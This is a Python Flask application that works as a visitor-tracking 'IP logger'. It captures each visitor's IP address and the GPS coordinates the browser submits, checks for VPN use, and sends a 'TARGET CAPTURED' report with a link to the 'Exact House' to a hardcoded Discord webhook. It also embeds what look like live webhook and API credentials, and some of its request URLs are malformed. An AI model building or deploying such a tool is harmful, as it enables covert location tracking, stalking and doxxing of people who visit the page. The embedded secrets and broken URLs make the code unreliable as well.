import os
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# --- CONFIGURATION ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1482323306198601780/bvnAqpLHXijSAMi0fwJQV-IZG2nXdoScT4MFttVL3e42cXtol1HiGDGqR1AdsscKDzKG"
IP_API_KEY = "6DE085F79B20D090372DCDAB19FA7413"

@app.route('/')
def index():
    # Get the real IP to show it on the website
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if visitor_ip and ',' in visitor_ip:
        visitor_ip = visitor_ip.split(',')[0].strip()
    
    # Pass the IP to the HTML
    return render_template('index.html', user_ip=visitor_ip)

@app.route('/geo', methods=['POST'])
def capture():
    data = request.json
    lat, lon = data.get('lat'), data.get('lon')
    
    # Re-capture IP for the Discord report
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if visitor_ip and ',' in visitor_ip:
        visitor_ip = visitor_ip.split(',')[0].strip()

    # Get Geo/VPN data for the webhook
    try:
        api_res = requests.get(f"https://api.ip2location.io{IP_API_KEY}&ip={visitor_ip}&format=json").json()
        vpn = "✅ YES" if api_res.get('is_proxy') else "❌ NO"
        city, country = api_res.get('city_name'), api_res.get('country_name')
    except:
        vpn, city, country = "Unknown", "Unknown", "Unknown"

    payload = {
        "username": "Captain Hook",
        "embeds": [{
            "title": "🌐 TARGET CAPTURED",
            "color": 3066993,
            "fields": [
                {"name": "IP Address", "value": f"`{visitor_ip}`", "inline": False},
                {"name": "VPN Detected", "value": vpn, "inline": True},
                {"name": "ISP Location", "value": f"{city}, {country}", "inline": True},
                {"name": "Google Maps (GPS)", "value": f"[Click to View Exact House](https://www.google.com{lat},{lon})", "inline": False}
            ],
            "footer": {"text": "IP Lookup Tool v2.0"}
        }]
    }
    requests.post(DISCORD_WEBHOOK_URL, json=payload)
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
